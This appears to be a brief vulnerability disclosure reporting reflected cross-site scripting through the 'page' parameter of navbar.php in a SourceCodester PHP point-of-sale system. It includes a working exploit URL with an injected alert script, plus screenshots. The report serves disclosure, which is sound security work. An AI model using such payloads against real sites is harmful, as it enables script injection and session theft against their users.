vendor：https://www.sourcecodester.com/

download link：https://www.sourcecodester.com/php/16127/best-pos-management-system-php.html

Vulnerability trigger parameter: $page

The process of vulnerability discovery is as follows：


![image](https://user-images.githubusercontent.com/30823782/220945279-7462e6ff-1da0-43ee-9b67-939c9d364e68.png)

exp

```
http://192.168.31.50/kruxton/navbar.php?page=%27%3E%3C/script%3E%3Cscript%3Ealert(%22xss%22)%3C/script%3E
```
![image](https://user-images.githubusercontent.com/30823782/220945386-ef437201-6fc4-4fcf-ba71-3e99ed4ba41b.png)

